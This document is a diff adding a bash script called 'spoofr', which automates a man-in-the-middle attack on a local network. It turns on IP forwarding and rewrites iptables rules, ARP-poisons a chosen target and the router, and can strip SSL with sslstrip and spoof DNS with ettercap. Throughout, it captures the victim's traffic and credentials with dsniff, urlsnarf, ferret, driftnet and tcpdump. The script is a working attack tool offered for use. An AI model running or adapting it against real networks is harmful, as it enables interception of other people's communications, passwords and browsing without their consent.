@@ -1,0 +1,188 @@
+#!/bin/bash
+
+fsetup()
+{
+IPNUMF=$(ifconfig | grep Bcast)                                 
+IPNUM=${IPNUMF:20:14}                                                               	###define our ip address
+                                                                    
+DECCOUNT="0"
+CHARPLACE="0"
+DECPLACE="1"
+
+while [ $DECCOUNT != "3" ]                                                              ###define the last decimal place
+do                                     
+    CHARPLACE=$((CHARPLACE + 1))
+    DECPLACE=$((DECPLACE + 1))
+    IPCHAR=${IPNUM:$CHARPLACE:1}                                                        
+    
+	case $IPCHAR in                                                                ###define the decimal places
+		".")
+			DECCOUNT=$((DECCOUNT + 1));;
+	esac
+done
+
+ENET=${IPNUM:0:$DECPLACE}                                                               ###define the numbers up to the last decimal
+NODENUM=${IPNUM:$CHARPLACE:3}                                                           ###define the numbers after last decimal 
+NICF=$(ifconfig | grep Bcast -B 1)                                                      ###define the connected interface
+NIC=${NICF:0:8}                                           
+AROUTR=$(route -n | grep $NIC)
+NODER=$(($DECPLACE + 3))
+ROUTRF=${AROUTR:16:$NODER}
+ROUTR=${ROUTRF:$DECPLACE:3}
+ROUTR=$(($ROUTR + 1 -1))
+ROUTR=$ENET$ROUTR                                                                       ###define the router ip
+GTERM="gnome-terminal --geometry="
+ETTER=$(locate etter.dns)
+}
+
+
+fattack()
+{
+if [ $SSLDO -z ]
+	then
+		read -p " [>] Do you want to break SSL? [y/N]: " DOSSL
+	else
+		DOSSL=$SSLDO
+fi
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables -P FORWARD ACCEPT
+iptables --table nat --delete-chain
+iptables -t nat -A POSTROUTING -o $NIC -j MASQUERADE
+clear
+
+echo " [*] IP forwarding enabled"
+
+case $DOSSL in
+	"y")
+		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+		echo " [*] SSL broken";;
+esac
+
+arp
+
+if [ $TARG -z ]
+	then
+		read -p " [>] TARGET IP: $ENET" TARG                                                                 
+		TARG1=$ENET$TARG 
+	else
+		TARG1=$ENET$TARG
+fi
+
+clear
+echo " [*] Starting dsniff, tcpdump, driftnet, urlsnarf, ferret and spoofing in new windows, let's party.."
+
+case $DOSSL in
+	"y")
+		$GTERM --geometry=10x5+200+600 -x sslstrip -f -k;;
+esac
+
+$GTERM --geometry=70x5+0+600 -x dsniff -i $NIC -w /root/Desktop/test/dsniff$RANDOM
+$GTERM --geometry=70x18+0+0 -x urlsnarf -i $NIC
+$GTERM --geometry=70x15+200+320 -x ferret -i $NIC
+$GTERM --geometry=70x5+200+320 -x driftnet -i $NIC -p -d /root/Desktop/test/driftnet
+$GTERM --geometry=70x5+0+600 -x arpspoof -i $NIC -t $TARG1 $ROUTR
+$GTERM --geometry=70x5+0+700 -x arpspoof -i $NIC -t $ROUTR $TARG1
+$GTERM --geometry=70x5+0+600 -x tcpdump -w /root/Desktop/test/tcpdump$RANDOM.pcap -i $NIC
+fattack2
+}
+
+fattack2()
+{
+while [ true ]
+	do
+		clear
+		echo " [*] press CTRL+C or ENTER clean up and exit [*]" 
+		echo ' [>] press "d" and then ENTER for DNS spoofing' 
+		read -p " [>] NEXT TARGET IP: $ENET" TARG2                                                   #### <<user input needed to attack
+		case $TARG2 in
+	        "")fexit
+	        ;;
+	        "d")fdnspoof;;"D")fdnspoof
+			;;
+			*)
+	        TARG1=$ENET$TARG2
+	        echo
+	        echo
+	        echo " [*] ATTACKING $TARG1 [*]"
+	        $GTERM --geometry=70x5+0+600 -x arpspoof -i $NIC -t $TARG1 $ROUTR 
+            $GTERM --geometry=70x5+0+700 -x arpspoof -i $NIC -t $ROUTR $TARG1
+        esac
+	done
+fexit
+}
+
+fdnspoof (){
+	read -p " [*] Do you want to edit etter.dns? [Y/n]: " EDITDNS
+	case $EDITDNS in
+		"")vi $ETTER;;
+		"y")vi $ETTER;;
+		"Y")vi $ETTER
+	esac
+	clear
+	echo
+	echo " [*] DNS SPOOFING TIME £-P"
+	read -p " [>] TARGET IP/RANGE: $ENET" TARG
+	TARG1=$ENET$TARG
+	echo " [*] Press CTRL+C to quit..."
+	sleep 0.7
+	ettercap -T -q -i $NIC -P dns_spoof -M arp /$ROUTR/ /$TARG1/
+	fattack2
+}
+
+fhelp()
+{
+	clear
+	echo """ spoofr - ARP poison and sniff with 
+	DNS spoofing, urlsnarf, driftnet, ferret, dsniff, sslstrip and tcpdump.
+	
+Usage:  	spoofr x y
+				x - Target IP address extension
+				y - Break ssl (1/0)
+			
+		eg. spoofr 100 1
+			attack $ENET"100" and break SSL"""
+			exit
+}
+
+fexit (){                                                                             ###exit function
+	killall dsniff
+	killall urlsnarf
+	killall arpspoof
+	killall driftnet
+	killall ferret
+	killall sslstrip
+	killall tcpdump
+	echo 0 > /proc/sys/net/ipv4/ip_forward
+	iptables --flush
+	iptables --table nat --flush
+	iptables --delete-chain
+	iptables --table nat --delete-chain
+	clear
+	echo " [*] All systems are shutting down, Bye!" 
+	sleep 1.5
+	clear
+	exit
+}
+
+trap fexit 2
+
+fsetup
+
+if [ $# -gt 0 ]
+	then
+		TARG=$1
+		case $2 in
+				1)SSLDO="y";;
+				"0")SSLDO="n"
+		esac
+fi
+
+case $1 in
+"-h")fhelp;;
+"--help")fhelp
+esac
+
+fattack
